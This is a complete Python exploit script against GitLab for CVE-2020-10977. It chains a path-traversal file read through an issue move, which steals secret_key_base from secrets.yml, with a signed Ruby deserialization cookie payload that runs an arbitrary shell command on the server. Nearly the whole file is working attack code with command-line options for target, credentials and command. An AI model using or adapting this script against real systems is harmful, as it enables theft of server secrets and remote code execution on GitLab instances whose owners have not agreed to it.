#! /usr/bin/env python

import argparse
import base64
import hashlib
import hmac
import requests
import traceback
import uuid
import urllib3

from typing import Optional
from bs4 import BeautifulSoup
from contextlib import contextmanager


class GitLabSession:
    def __init__(self, url: str, username: str, password: str, verify: bool = False):
        self.url = url
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.verify = verify

        if not verify:
            # Disable these warnings, they are a bit too much. If you provide --insecure you know what you are in for.
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def login(self) -> bool:
        login_url = f"{self.url}/users/sign_in"
        response = self.session.get(login_url, verify=False)

        if not response.ok:
            return False

        csrf_token = self.extract_csrf_token(response.text)

        login_data = {
            "utf8": "✓",
            "authenticity_token": csrf_token,
            "user[login]": self.username,
            "user[password]": self.password,
            "user[remember_me]": 0,
        }

        response = self.session.post(login_url, data=login_data, allow_redirects=False)
        return response.status_code == 302 and "redirected" in response.text

    def extract_csrf_token(self, page: str) -> str:
        soup = BeautifulSoup(page, "html.parser")
        meta = soup.find("meta", attrs={"name": "csrf-token"})

        if meta is None:
            raise Exception("Can't find csrf-token on the page")

        return meta.attrs["content"]

    def create_project(self, name: str) -> str:
        response = self.session.get(f"{self.url}/projects/new")

        if not response.ok:
            raise Exception(response.text)

        csrf_token = self.extract_csrf_token(response.text)

        soup = BeautifulSoup(response.text, "html.parser")
        namespace_element = soup.find(id="project_namespace_id")
        namespace_id = namespace_element.attrs["value"]

        project_data = {
            "utf8": "✓",
            "authenticity_token": csrf_token,
            "project[ci_cd_only]": False,
            "project[name]": name,
            "project[namespace_id]": namespace_id,
            "project[path]": name,
            "project[description]": "",
            "project[visibility_level]": 0,
        }

        response = self.session.post(f"{self.url}/projects", data=project_data)

        if response.ok:
            soup = BeautifulSoup(response.text, "html.parser")
            project_id = soup.find("body").attrs["data-project-id"]

            response = self.session.get(f"{self.url}/api/v4/projects/{project_id}")
            return response.json()
        else:
            raise Exception(
                f"Invalid status code creating a project: {response.status_code}"
            )

    def remove_project(self, project_name: str):
        response = self.session.get(f"{self.url}/{self.username}/{project_name}")

        if not response.ok:
            raise Exception(response.text)

        csrf_token = self.extract_csrf_token(response.text)

        project_data = {
            "utf8": "✓",
            "_method": "delete",
            "authenticity_token": csrf_token,
        }

        response = self.session.post(
            f"{self.url}/{self.username}/{project_name}",
            data=project_data,
            allow_redirects=False,
        )

        return response.status_code == 302 and "redirected" in response.text

    def create_issue(self, project: dict, title: str, description: str) -> str:
        project_name = project["name"]
        project_id = project["id"]
        response = self.session.get(
            f"{self.url}/{self.username}/{project_name}/issues/new"
        )

        if not response.ok:
            raise Exception(response.text)

        csrf_token = self.extract_csrf_token(response.text)

        issue_data = {
            "utf8": "✓",
            "authenticity_token": csrf_token,
            "issue[title]": title,
            "issue[description]": description,
            "issue[confidential]": 0,
            "issue[assignee_ids][]": 0,
            "issue[label_ids][]": "",
            "issue[due_date]": "",
            "issue[lock_version]": 0,
        }

        response = self.session.post(
            f"{self.url}/{self.username}/{project_name}/issues", data=issue_data
        )

        if response.status_code == 200:
            location = response.url
            issue_iid = location.split("/")[-1]
            response = self.session.get(
                f"{self.url}/api/v4/projects/{project_id}/issues/{issue_iid}"
            )
            return response.json()
        else:
            raise Exception(response.text)

    def move_issue(self, issue, from_project, to_project) -> bool:
        from_project_name = from_project["name"]
        issue_iid = issue["iid"]
        issue_url = f"{self.url}/{self.username}/{from_project_name}/issues/{issue_iid}"

        response = self.session.get(issue_url)

        if not response.ok:
            raise Exception(response.text)

        csrf_token = self.extract_csrf_token(response.text)

        headers = {
            "X-CSRF-Token": csrf_token,
            "X-Requested-With": "XMLHttpRequest",
        }
        data = {
            "move_to_project_id": to_project["id"],
        }

        response = self.session.post(f"{issue_url}/move", headers=headers, data=data)

        if not response.ok:
            raise Exception(f"Create projects error: {response.status_code}")

        return response.json()

    def download_file(self, project, filepath: str):
        response = self.session.get(
            f"{self.url}/{project['path_with_namespace']}{filepath}"
        )

        if not response.ok:
            print(response.text)
            raise Exception(f"Create projects error: {response.status_code}")

        return response.text


class GitlabCVE202010997:
    """
    - https://nvd.nist.gov/vuln/detail/CVE-2020-10977
    - https://hackerone.com/reports/827052"""

    def __init__(
        self, gitlab_session: GitLabSession, file_to_lfi: Optional[str] = None
    ):
        self.gitlab_session = gitlab_session
        self.file_to_lfi = (
            file_to_lfi
            or "/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"
        )

    def create_lfi_path(self, path: str):
        return f"![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../..{path})"

    def extract_link_from_issue_description(self, description: str):
        filename = description[description.find("[") + 1 : description.find("]")]
        filepath = description[description.find("(") + 1 : description.find(")")]
        return filepath, filename

    def parse_secret_from_secrets_file(self, secrets_file: str):
        secret_key_base = secrets_file[
            secrets_file.find("secret_key_base: ")
            + 17 : secrets_file.find("otp_key_base")
            - 3
        ]
        return secret_key_base

    def exploit(self):
        project_one = None
        project_two = None

        try:
            print("[INFO] Logging into Gitlab ...")
            self.gitlab_session.login()
            print("[INFO] Login Successfull!")

            project_one_name = uuid.uuid4()
            print(f"[INFO] Creating project {project_one_name}")
            project_one = self.gitlab_session.create_project(project_one_name)

            project_two_name = uuid.uuid4()
            print(f"[INFO] Creating project {project_two_name}")
            project_two = self.gitlab_session.create_project(project_two_name)

            issue_name = uuid.uuid4()
            print(f"[INFO] Creating issue {issue_name} in project {project_one_name}")
            issue = self.gitlab_session.create_issue(
                project_one,
                uuid.uuid4(),
                self.create_lfi_path(self.file_to_lfi),
            )

            print(
                f"[INFO] Moving issue {issue_name} from project {project_one_name} to {project_two_name}"
            )
            moved_issue = self.gitlab_session.move_issue(
                issue, project_one, project_two
            )

            filepath, filename = self.extract_link_from_issue_description(
                moved_issue["description"]
            )

            file = self.gitlab_session.download_file(project_two, filepath)

            print("[INFO] Extracting secret from file")
            secret = self.parse_secret_from_secrets_file(file)
            return secret
        finally:
            if project_one is not None:
                self.gitlab_session.remove_project(project_one["name"])

            if project_two is not None:
                self.gitlab_session.remove_project(project_two["name"])


class GitlabRCE:
    def __init__(self, url: str):
        self.url = url

    def generate_payload(self, secret: str, cmd: str) -> str:
        code = f"coding:UTF-8\n_erbout = +''; _erbout.<<(( `{cmd}` ).to_s); _erbout\x06:\x06EF:\x0e"
        lenChar = chr(len(code) - 1)
        payload = '\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0e@instanceo:\x08ERB\x0b:\x10@safe_level0:\t@srcI"{len}#{code}@encodingIu:\rEncoding\nUTF-8\x06;\nF:\x13@frozen_string0:\x0e@filename0:\x0c@linenoi\x00:\x0c@method:\x0bresult:\t@varI"\x0c@result\x06;\nT:\x10@deprecatorIu:\x1fActiveSupport::Deprecation\x00\x06;\nT'
        payload = payload.replace("{len}", lenChar).replace("{code}", code)

        key = hashlib.pbkdf2_hmac(
            "sha1",
            password=secret.encode(),
            salt=b"signed cookie",
            iterations=1000,
            dklen=64,
        )
        base64_payload = base64.b64encode(payload.encode())
        digest = hmac.new(key, base64_payload, digestmod=hashlib.sha1).hexdigest()
        return base64_payload.decode() + "--" + digest

    def send_payload(self, payload: str):
        cookie = {"experimentation_subject_id": payload}
        response = requests.get(
            f"{self.url}/users/sign_in", cookies=cookie, verify=False
        )

        print(response.status_code)

    def run(self, secret: str, cmd: str):
        payload = self.generate_payload(secret, cmd)
        self.send_payload(payload)


def main(args):
    try:
        gitlab_session = GitLabSession(
            args.url, args.username, args.password, not args.insecure
        )
        cve2020_10997 = GitlabCVE202010997(gitlab_session)
        rce = GitlabRCE(args.url)

        secret = cve2020_10997.exploit()

        if args.cmd is not None:
            rce.run(secret, args.cmd)
        else:
            print(f"[INFO] GitLab Secret: {secret}")

        return 0
    except:
        print(f"[ERROR] Unknown error:")
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    parser.add_argument("--url", help="Target URL", type=str, required=True)
    parser.add_argument(
        "-u", "--username", help="Gitlab username", type=str, required=True
    )
    parser.add_argument(
        "-p", "--password", help="Gitlab password", type=str, required=True
    )
    parser.add_argument("--cmd", help="Command to execute", type=str)

    parser.add_argument(
        "--insecure",
        help="Allow insecure server connections when using SSL",
        default=False,
        action="store_true",
    )

    args = parser.parse_args()

    main(args)
